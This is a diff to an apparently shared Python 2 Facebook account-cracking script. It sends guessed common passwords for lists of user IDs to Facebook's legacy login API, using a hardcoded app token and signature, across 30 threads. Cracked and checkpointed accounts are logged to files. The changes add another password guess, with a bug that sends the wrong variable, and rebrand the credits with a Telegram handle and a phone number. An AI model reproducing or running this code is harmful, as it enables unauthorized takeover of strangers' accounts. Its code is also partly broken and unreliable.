@@ -351,7 +351,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Pakistan'
+									pass4 = 'afghan'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -408,8 +408,22 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
+
 		
-			
+			else:
+									pass8 = '100200'
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									q = json.load(data)
+									if 'access_token' in q:
+										print '\x1b[1;91mSuccessful\x1b[1;97m-\x1b[1;94m\x1b[1;96m-' + user + '-\x1b[1;93m\x1b[1;91m-' + pass4
+										oks.append(user+pass8)
+									else:
+										if 'www.facebook.com' in q["error_msg"]:
+											print '\x1b[1;93mAfter7Days\x1b[1;97m-\x1b[1;93m\x1b[1;96m-' + user + '-\x1b[1;93m\x1b[1;93m-' + pass4
+											cek = open("out/checkpoint.txt", "a")
+											cek.write(user+"|"+pass4+"\n")
+											cek.close()
+											cekpoint.append(user+pass8)
 																	
 																	
 															
@@ -419,12 +433,14 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 
-	print "  \033[1;93m�-------Developed By Muhammad Akbar-----�" #Dev:Muhammad_Hamza
+	print "  \033[1;93m�-------Developed By Binyamin Jan-----�" #Dev:@KABIR_H4CK_001
 	print '\033[1;91mProcess Has Been Completed Press Ctrl+Z. Next Type (python2 aoun.py)\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
 	print """
            --------Checkpoint ID Open After 7 Days --------
-                WhatsApp Num
+                کانال تلگرام 
+@KABIR_H4CK_001
+
               \033[1;93m +92 302 4171606"""
 	
 	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
